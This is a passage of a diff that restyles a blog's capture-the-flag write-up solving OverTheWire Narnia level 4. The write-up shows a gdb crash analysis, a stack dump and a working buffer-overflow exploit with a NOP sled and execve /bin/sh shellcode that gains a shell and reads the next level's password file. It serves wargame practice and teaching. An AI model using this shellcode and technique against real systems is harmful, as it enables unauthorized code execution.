+<span class="go">Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
 
-Program received signal SIGSEGV, Segmentation fault.
-0x316a4130 in ?? ()
-</pre></div>
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x316a4130 in ?? ()</span>
+</code></pre></div>
 </p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 0x316a4130
-Pattern 0x316a4130 first occurrence at position 272 in pattern.
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">local $] ./pattern.py 0x316a4130</span>
+<span class="go">Pattern 0x316a4130 first occurrence at position 272 in pattern.</span>
+</code></pre></div>
 </p>
 
 <p>This tells us we have 272 bytes to play with. Plenty of space to construct
 a nopsled and shellcode payload. Let&rsquo;s find out what we need to write into
 <code>EIP</code>.</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)
-Starting program: /games/narnia/narnia4 $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)</span>
+<span class="go">Starting program: /games/narnia/narnia4 $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)</span>
 
-Program received signal SIGSEGV, Segmentation fault.
-0x62626262 in ?? ()
-(gdb) x/200x $esp
-0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea
-0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
-0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
-0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000
-0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
-0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
-0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
-0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
-0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c
-0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000
-0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1
-0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d
-0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
-0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
-0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
-0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
-0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
-0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000
-0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
-0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
-0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
-0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
-0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
-0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
-0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
-0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
-0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c
-0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836
-0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000
-0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
-0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161
-0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000
-0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
-0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
-</pre></div>
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x62626262 in ?? ()</span>
+<span class="go">(gdb) x/200x $esp</span>
+<span class="go">0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea</span>
+<span class="go">0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc</span>
+<span class="go">0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000</span>
+<span class="go">0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000</span>
+<span class="go">0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0</span>
+<span class="go">0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000</span>
+<span class="go">0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1</span>
+<span class="go">0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550</span>
+<span class="go">0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c</span>
+<span class="go">0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000</span>
+<span class="go">0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1</span>
+<span class="go">0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d</span>
+<span class="go">0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3</span>
+<span class="go">0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16</span>
+<span class="go">0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a</span>
+<span class="go">0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000</span>
+<span class="go">0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000</span>
+<span class="go">0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000</span>
+<span class="go">0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034</span>
+<span class="go">0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008</span>
+<span class="go">0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000</span>
+<span class="go">0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4</span>
+<span class="go">0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4</span>
+<span class="go">0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000</span>
+<span class="go">0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2</span>
+<span class="go">0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000</span>
+<span class="go">0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c</span>
+<span class="go">0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836</span>
+<span class="go">0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000</span>
+<span class="go">0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f</span>
+<span class="go">0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161</span>
+<span class="go">0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000</span>
+<span class="go">0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000</span>
+<span class="go">0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000</span>
+</code></pre></div>
 </p>
 
 <p>Our input starts at around <em>0xffffd7a8</em> so let&rsquo;s get going writing our payload.
@@ -646,18 +647,79 @@ the same shellcode as before, and finish with an address that sits comfortably
 in the sled. You normally need to play with the address a bit, as the offsets
 inside <em>gdb</em> are a bit different.</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia4@melinda:/narnia$ ./narnia4 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\x90&#39;*(272-25) + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x30\xd8\xff\xff&#39;&quot;`</span>
-$ whoami
-narnia5
-$ cat /etc/narnia_pass/narnia5
-[password]
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia4@melinda:/narnia$</span> ./narnia4 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\x90&#39;*(272-25) + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x30\xd8\xff\xff&#39;&quot;</span><span class="sb">`</span>
+<span class="gp">$</span> whoami
+<span class="go">narnia5</span>
+<span class="gp">$</span> cat /etc/narnia_pass/narnia5
+<span class="go">[password]</span>
+</code></pre></div>
 </p>
 
-			</div>
+      </article>
 
-			
-		</div>
+      <p class="post-meta">Tags:&nbsp;
+        
+            
+            <a href="http://unlogic.co.uk//tags/ctf">ctf</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/wargame">wargame</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/overthewire">overthewire</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/narnia">narnia</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/security">security</a>
+        
+      </p>
 
-  </body>
+      
+<div id="disqus_thread">
+  <script type="text/javascript">
+     var disqus_shortname = "unlogic";
+     var disqus_identifier = "\/2015\/04\/08\/solving-narnia-part1\/";
+
+     (function() {
+       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+     })();
+  </script>
+</div>
+
+
+    </div>
+  </div>
+</div>
+    <footer class="footer">
+      <div class="p2 wrap">
+        <div class="measure mt1 center">
+      <nav class="social-icons icons">
+<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>
+
+<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>
+
+</nav>
+
+          <small>
+            Copyright &#169; 2015<br>
+            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
+          </small>
+        </div>
+      </div>
+    </footer>
+
+    
+    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    
+
+
+</body>
 </html>
+
